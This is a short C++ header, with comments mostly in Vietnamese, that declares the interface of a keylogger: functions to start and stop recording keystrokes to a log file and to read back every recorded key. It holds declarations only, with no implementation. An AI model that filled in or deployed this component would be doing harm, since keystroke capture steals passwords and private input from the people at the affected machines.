#ifndef KEYLOGGER_H
#define KEYLOGGER_H

#include <string>

//  * Start keylogging - bắt đầu ghi lại các phím bàn phím
//  * Tạo file log và bắt đầu lưu trữ
//  * 
//  * @return std::string - "✓ Keylogger started" hoặc "⚠ Keylogger already running"
//  */
std::string keyloggerStart();

/**
 * Stop keylogging - dừng ghi lại các phím
 * Đóng file log
 * 
 * @return std::string - "✓ Keylogger stopped" hoặc "⚠ Keylogger not running"
 */
std::string keyloggerStop();

/**
 * Get logs - lấy nội dung tất cả các phím đã ghi lại
 * Đọc file log từ đĩa cứng
 * 
 * @return std::string - Nội dung file log (tất cả các phím đã nhấn)
 *                       Hoặc "✗ Failed to read logs" nếu thất bại
 */
std::string keyloggerGetLogs();

#endif
